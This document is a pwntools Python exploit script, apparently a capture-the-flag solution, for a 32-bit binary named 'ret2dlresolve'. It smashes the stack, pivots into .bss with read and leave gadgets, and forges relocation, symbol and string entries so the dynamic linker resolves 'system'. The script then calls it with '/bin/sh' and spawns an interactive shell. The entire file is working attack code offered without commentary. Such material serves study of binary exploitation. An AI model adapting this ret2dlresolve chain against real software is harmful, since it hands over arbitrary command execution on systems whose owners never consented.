#!/usr/bin/python3
from pwn import *
elf = ELF('./ret2dlresolve')


write_plt = elf.plt['write']
read_plt = elf.plt['read']
plt0 = elf.get_section_by_name('.plt').header.sh_addr 
write_got = elf.got['write']
ppp = 0x8049301
pop_ebp = 0x8049303
leave = 0x8049115

baseaddr = elf.get_section_by_name('.bss').header.sh_addr +0x800
print(hex(write_plt),hex(write_got),hex(read_plt),hex(plt0),hex(baseaddr))


def base(section):
    return elf.get_section_by_name(section).header.sh_addr

p = process('./ret2dlresolve')

payload = b'a' * 0x6c
payload += b'bbbb'
payload += p32(read_plt)
payload += p32(ppp)
payload += p32(0)
payload += p32(baseaddr)
payload += p32(0x100)
payload += p32(pop_ebp)
payload += p32(baseaddr-4)
payload += p32(leave)
payload = payload.ljust(0x100, b'a')
p.send(payload)

fake_rel = 0x40
fake_sym = 0x50
fake_str = 0x80
fake_cmd = 0x90
reloc_arg = baseaddr + fake_rel - base('.rel.plt')
r_info = baseaddr + fake_sym - base('.dynsym')
print("rel.plt",hex(base('.rel.plt')),"dynstr",hex(base('.dynstr')))
print("r_info:",hex(r_info), "dysym:",hex(base('.dynsym')),"fake_sym:",hex(fake_sym+baseaddr))

if(r_info&0xf >0):
    tmp=0x10- r_info&0xf
    r_info+=tmp
    fake_sym+=tmp

print("r_info:",hex(r_info), "dysym:",hex(base('.dynsym')),"fake_sym:",hex(fake_sym+baseaddr))
r_info = ((r_info //0x10) << 8) + 0x07
st_name = baseaddr + fake_str - base('.dynstr')
cmd = b'/bin/sh\0'
print("r_info:",hex(r_info), "dysym:",hex(base('.dynsym')),"fake_sym:",hex(fake_sym+baseaddr))
payload = p32(plt0)
payload += p32(reloc_arg) #reloc_arg+rel.plt=fake_rel+baseaddr
payload +=  b'AAAA'
payload += p32(baseaddr+fake_cmd)
payload = payload.ljust(fake_rel, b'A')
payload += p32(write_got) # r_offset
payload += p32(r_info) # r_info
payload = payload.ljust(fake_sym, b'A')
payload += p32(st_name) # st_name
payload += p32(0) # st_value
payload += p32(0) # st_size
payload += p32(0x12) # st_info, st_other, st_shndx
payload = payload.ljust(fake_str, b'A')
payload += b'system\0'
payload = payload.ljust(fake_cmd, b'A')
payload += cmd
payload = payload.ljust(0x100, b'A')
p.send(payload)

p.interactive()